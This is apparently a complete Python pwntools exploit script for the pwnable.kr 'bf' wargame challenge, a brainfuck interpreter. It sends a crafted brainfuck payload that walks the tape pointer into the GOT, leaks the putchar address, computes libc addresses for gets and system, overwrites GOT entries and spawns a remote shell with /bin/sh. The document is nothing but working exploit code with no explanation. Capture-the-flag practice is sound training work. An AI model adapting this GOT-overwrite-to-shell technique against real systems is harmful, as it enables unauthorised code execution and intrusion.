#!/usr/bin/python
from pwn import *

context.log_level='debug'
p=remote('pwnable.kr',9001)
libc=ELF('./bf_libc.so')

putchar_elf=libc.symbols['putchar']
gets_elf=libc.symbols['gets']
system_elf=libc.symbols['system']

putchar_got=0x0804A030
memset_got=0x0804A02C
fgets_got=0x0804A010
p_addr=0x0804A0A0

def back(n):
	return '<'*n
def read(n):
	return '.>'*n
def write(n):
	return ',>'*n


payload = back(p_addr-putchar_got) + '.' + read(4)
payload += back(4) + write(4)
payload += back(putchar_got-memset_got+4)+write(4)
payload += back(memset_got-fgets_got+4)+write(4)
payload += '.'

p.recvuntil(']\n')
p.sendline(payload)
p.recv(1)


putchar = u32(p.recv(4))
log.success("putchar="+hex(putchar))

gets = putchar-putchar_elf+gets_elf
log.success("gets=" + hex(gets))

system = putchar-putchar_elf+system_elf
log.success("system="+hex(system))

main_addr=0x08048671
p.send(p32(main_addr))
p.send(p32(gets))
p.send(p32(system))
p.send("/bin/sh\n")
p.interactive()
